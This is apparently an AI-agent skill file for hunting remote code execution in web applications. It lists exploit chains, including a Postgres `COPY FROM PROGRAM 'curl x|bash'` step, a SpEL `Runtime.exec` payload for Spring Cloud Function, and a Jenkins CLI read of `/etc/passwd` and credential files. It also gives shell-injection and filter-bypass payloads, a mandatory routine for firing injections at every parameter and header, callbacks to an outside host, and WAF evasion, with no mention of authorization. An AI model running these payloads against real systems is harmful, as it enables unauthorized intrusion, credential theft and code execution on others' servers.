---
name: hunt-rce
description: Command / code execution hunting — the compositional view (primitive + gadget), content-type silent failure modes, 6 canonical RCE shapes, framework CVEs (Spring Cloud Function SpEL, args4j Jenkins, ingress-nginx), shell injection operator precedence, bypass table, OOB validation. Use when exec-style endpoints, template engines, or framework vulnerabilities are suspected. Trigger keywords: RCE, command injection, code execution, SpEL, OGNL, webshell.
---

# Remote Code Execution — Deep Hunting

## THE GATE
Content-type is the #1 silent failure mode: form endpoints need form-encoding; `/api/*` needs JSON. Operator prevalence: `;`, `|`, `&&`, `$(id)`, `` `id` ``.

## The Compositional View (the whole game)
Every RCE chain = **(primitive that gets bytes onto the host)** + **(gadget that interprets them)**. Six canonical shapes:
1. SSRF + IMDSv1 → Lambda invoke (Capital One class)
2. Postgres SQLi `COPY ... FROM PROGRAM 'curl x|bash'`
3. Upload + path-traversal filename → webshell
4. Prototype pollution → `child_process.spawn` via `Object.prototype.shell` / `env.NODE_OPTIONS`
5. ViewState + machineKey → ysoserial.net
6. XXE + `expect://`

## Framework CVEs
- **Spring Cloud Function CVE-2022-22963**: `spring.cloud.function.routing-expression` SpEL header on `/functionRouter`; use `T(java.lang.Runtime).getRuntime().exec(new String[]{"id"})` array form to dodge shell-quoting.
- **args4j @-file expansion (Jenkins CVE-2024-23897)**: `java -jar jenkins-cli.jar -s http://target -http help 1 @/etc/passwd` — error echo = arbitrary file read; crown jewels `secret.key`, `credentials.xml`, `users/*/config.xml`.
- **Ingress-nginx**: path injection `/something)(;.*);#` in `spec.rules.http.paths.path` → nginx config injection.
- Config-as-code: syslog-ng `program()` destinations, collectd exec plugins, Nomad `{{runscript "id"}}`.

## Bypass Table
`cat${IFS}/etc/passwd`, `{cat,/etc/passwd}`, `$'\x63\x61\x74'`, newline injection `$'\ncurl x\n'`; Ruby `send(:system,"id")`; template `{% for %}`+`lipsum.__globals__` when output filtered.

## Detection
Header fingerprints (`X-GitHub-Enterprise-Version`, `Content-Type: application/yaml`, `Server: nginx (ingress-nginx)`); grep `exec|system|popen|spawn|eval`.

## Validation
Visible `id` output or OOB DNS callback with unique marker. Never "could lead to RCE" without end-to-end demo.

## Common Mistakes
JSON-vs-form false negatives; claiming "could lead to RCE"; forgetting `--path-as-is`; skipping the "what interprets my bytes" half; never verifying blind RCE OOB.

## PARAMETER COVERAGE — injection on EVERY param and header (MANDATORY)
The #1 miss: testing only params NAMED cmd/exec/ping/host/domain and skipping
every other parameter plus all headers. Command injection hides in search
terms, filenames, email headers, User-Agent/Referer (log/analytics sinks),
X-Forwarded-For (blocking systems), image/conversion params, and any value
interpolated into a shell string.

1. **Enumerate** every input surface: all query keys, path segments, form/JSON
   keys (recursive), headers, cookies, filenames in uploads.
2. **On EACH input run the operator ladder** (respect content-type: form vs
   JSON — wrong encoding = silent false negative):
   - `;id`, `|id`, `&&id`, `||id`, `` `id` ``, `$(id)`, `%0aid`
   - `${IFS}`/`{cat,/etc/passwd}`/`$'\x63\x61\x74'` when spaces are filtered
   - newline injection `$'\ncurl <collab>\n'` for blind verification
3. **Every header gets the ladder too** — User-Agent, Referer,
   X-Forwarded-For, X-Forwarded-Host (logging/blocking/email sinks).
4. **Blind confirmation** is OOB (DNS/HTTP callback with unique marker per
   sink) — never report "could lead to RCE" without an end-to-end demo.
5. **WAF block → bypass ladder** (encoding, case, `${IFS}`, newline, comments),
   never drop the param.
6. **Re-sweep per context**: anon vs authed, form vs JSON, web vs API vs
   mobile.
7. **Track** `endpoint → param/header → operator → result` in the journal;
   unlogged input = gap.

## FIELD DATA — mined from HackerOne disclosed reports (10k-report corpus)

### Class: command-injection — 177 disclosed H1 reports (115 High/Critical)

**Parameters seen in real findings** (recurring; test each on every endpoint):

- `id`
- `scope`
- `search`
- `ref`
- `directory`
- `external`
- `isJTN`
- `dag_id`
- `ibm-submit`
- `path`

**Representative finding shapes** (real report titles, genericized — use as test-case ideas, not templates):

- **[critical] Remote Command Execution via Github import** (Command Injection - Generic)
  - Signal: ### Summary This is very similar to https://about.gitlab.com/releases/2022/08/22/critical-security-release-gitlab-15-3-1-released/#Remote%20Command%20Execution%20via%20Github%20imp
- **[critical] RCE via the DecompressedArchiveSizeValidator and Project BulkImports (behind feature flag)** (Command Injection - Generic)
  - Signal: ### Summary The `DecompressedArchiveSizeValidator` is used to check the size of a archive before extracting it: https://gitlab.com/gitlab-org/gitlab/-/blob/v15.1.0-ee/lib/gitlab/im
- **[critical] RCE via github import** (OS Command Injection)
  - Signal: Hello, While continuing mining on [github import](https://hackerone.com/reports/1665658), I found a vulnerability on gitlab.com allowing to execute remotely arbitrary commands. Git
- **[critical] Command injection by overwriting authorized_keys file through GitLab import** (Command Injection - Generic)
  - Signal: The `Projects::GitlabProjectsImportService` contains a vulnerability that allows an attacker to write files to arbitrary directories on the server. This leads to an arbitrary comma

